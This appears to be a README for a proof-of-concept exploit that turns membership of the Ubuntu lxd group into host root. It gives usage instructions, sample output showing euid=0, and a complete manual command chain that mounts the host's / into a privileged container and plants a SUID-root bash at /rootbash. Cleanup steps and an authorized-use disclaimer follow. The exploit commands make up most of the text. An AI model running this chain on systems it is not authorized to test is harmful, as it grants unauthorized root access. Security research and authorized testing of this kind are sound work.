# PoC — `lxd` group → host root

`exploit.sh` automates the full chain described in
[`../report/lxd-group-privesc-report.md`](../report/lxd-group-privesc-report.md).
Running it as an unprivileged member of the `lxd` group yields an interactive
**root** shell on the host **without the sudo password**.

## Requirements

- A local user account that is a member of the `lxd` group
  (the Ubuntu installer-created primary account, UID 1000, qualifies by default).
- `lxd-installer` present **or** LXD already installed.
- Network egress on first run (to fetch the LXD snap and/or the base image).
  Once an image is cached locally, the `dir` backend needs no network.
- Tested on **Ubuntu 26.04 LTS Server**, kernel `7.0.0-15-generic`.

## Usage

```bash
chmod +x exploit.sh
./exploit.sh
```

On success you land in a shell where `id` reports `euid=0(root)`:

```text
$ id
uid=1000(user) ... groups=...,101(lxd)
$ ./exploit.sh
[*] User user is a member of the 'lxd' group.
[*] Creating privileged container privesc-1234.
[*] Planting SUID-root shell on host via the container (real host root).
[*] Success — SUID-root shell planted at /rootbash.
rootbash-5.3# id
uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=...,101(lxd)
```

## What it does (step by step)

1. **Verify** the current user is in the `lxd` group.
2. **Activate LXD** — if the daemon is not up, write to
   `/run/lxd-installer.socket` to socket-activate the root-run `lxd-installer`,
   which `snap install lxd`s on your behalf (no password, no polkit prompt).
3. **Init LXD** with the `dir` storage backend.
4. **Prepare an image** (`ubuntu:24.04` → local alias `osimg`).
5. **Launch a privileged container** (`security.privileged=true`) with the host
   `/` bind-mounted at `/mnt/host`.
6. **Drop a SUID-root `bash`** onto the host filesystem from inside the
   container (where container-UID-0 == host-UID-0).
7. **Exec** the SUID shell on the host → interactive root.

## Manual reproduction

If you prefer to run the chain by hand:

```bash
# 1. Initialize LXD (dir backend — no internet needed once an image is local)
lxc storage create default dir
lxc profile device add default root disk pool=default path=/

# 2. Prepare an image
lxc image copy ubuntu:24.04 local: --alias osimg

# 3. Privileged container with host / mounted
lxc init osimg privesc -c security.privileged=true
lxc config device add privesc hostroot disk source=/ path=/mnt/host
lxc start privesc

# 4. Plant a SUID-root shell on the host
lxc exec privesc -- /bin/sh
cp /mnt/host/bin/bash /mnt/host/rootbash
chmod +s /mnt/host/rootbash
exit

# 5. Use it
/rootbash -p
```

## Cleanup

The script force-deletes its container on exit. The planted `/rootbash` is left
in place as proof; remove it once done:

```bash
sudo rm -f /rootbash
lxc delete --force privesc 2>/dev/null || true
```

## ⚠️ Authorized use only

This PoC is provided for authorized security testing and educational purposes.
Run it only on systems you own or are explicitly permitted to test.
